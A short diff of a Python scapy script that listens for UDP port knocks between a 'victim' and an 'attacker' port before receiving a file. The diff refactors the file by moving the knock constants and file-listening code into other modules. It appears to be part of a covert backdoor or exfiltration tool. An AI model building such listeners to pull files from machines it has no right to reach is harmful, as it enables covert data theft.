@@ -3,14 +3,10 @@ from scapy.layers.inet import IP, UDP
 from crypto import *
 from config import *
 import time
-from transfer import *
+import utils
 
 knock_number = 0
 knock_timer =0
-knock_1 = "192.168.40.4"
-knock_2 = "192.168.50.5"
-knock_3 = "192.168.60.6"
-ALLOWED_TIME_BETWEEN_KNOCKS = 10
 
 def in_time():
     elapsed_time = time.time() - knock_timer
@@ -50,20 +46,12 @@ def sniff_knocks(packet):
 
 
 def ReceiveFile():
-    listen_for_file()
-
-
-
-
-
+    utils.listen_for_file()
 
 
 def main():
     print ("Listening for Knocks!")
     sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), prn=sniff_knocks)
-
-
-
 
 
 if __name__ == '__main__':
